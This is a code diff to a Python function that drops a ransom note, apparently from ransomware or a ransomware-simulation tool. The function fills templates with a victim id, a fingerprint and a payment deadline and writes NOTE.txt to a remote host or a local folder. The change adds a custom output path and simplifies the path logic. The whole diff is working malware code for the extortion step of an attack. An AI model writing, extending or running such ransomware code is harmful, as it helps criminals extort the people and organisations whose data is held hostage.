@@ -307,10 +307,13 @@ def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str
     deadline = _rn_cipher._deadline(hours)
     note_text = _rn_cipher._TEMPLATES[template](vid, fingerprint, deadline, hours)
 
+    override_dest = getattr(args, "note_out", None)
     if host and not local_output:
-        if base_path:
+        if override_dest:
+            sink_path = str(override_dest)
+        elif base_path:
             note_base = Path(base_path)
-            if not str(note_base).endswith("/") and "." in note_base.name:
+            if "." in note_base.name:
                 note_base = note_base.parent
             sink_path = str(note_base / "NOTE.txt")
         else:
@@ -329,10 +332,13 @@ def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str
                     pass
         return (f"{host}:{sink_path}", note_text)
     else:
-        local_note = Path(base_path)
-        if local_note.is_file():
-            local_note = local_note.parent
-        note_path = local_note / "NOTE.txt"
+        if override_dest:
+            note_path = Path(override_dest)
+        else:
+            local_note = Path(base_path)
+            if local_note.is_file():
+                local_note = local_note.parent
+            note_path = local_note / "NOTE.txt"
         try:
             note_path.write_text(note_text, encoding="utf-8")
         except OSError as exc:
